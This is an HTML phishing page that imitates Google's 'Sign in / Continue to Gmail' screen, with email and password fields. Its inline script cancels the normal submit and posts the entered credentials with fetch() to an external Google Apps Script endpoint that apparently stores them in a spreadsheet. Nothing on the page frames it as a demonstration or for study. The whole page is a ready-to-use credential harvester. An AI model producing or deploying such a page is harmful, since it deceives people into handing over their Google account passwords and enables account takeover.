<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  
      <div class="maindiv">
        <img src="google.png" alt="Google">
        <h1>Sign in</h1>
        <h3>Continue to Gmail</h3>
        <form name='submit-to-google-sheet'>
        <div class="inputs">
          <div class="Fields">
            <div class="Fieldset">
              <input type="text" class="Before-FS" required="" name="email" autocomplete="off">
              <h1 class="Fs-H"><span>Email or phone</span></h1>
              <label class="placeholder">Email or phone</label>
            </div>
          </div>
          <div class="Fields">
            <div class="Fieldset">
              <input type="password" name="password" class="Before-FS" required="" >
              <h1 class="Fs-H"><span>Password</span></h1>
              <label class="placeholder">Password</label>
            </div>
          </div>
        </div>
          <button type="submit">Login</button>
        </form>
      </div>
<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbxMZmv80-NkGuMhOlppeD7orRcdZZ3RoYnCjoLMg3KqrvHZ2ogS-i9QnVa2gyqOJVTN/exec'
  const form = document.forms['submit-to-google-sheet']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
</body>
</html>
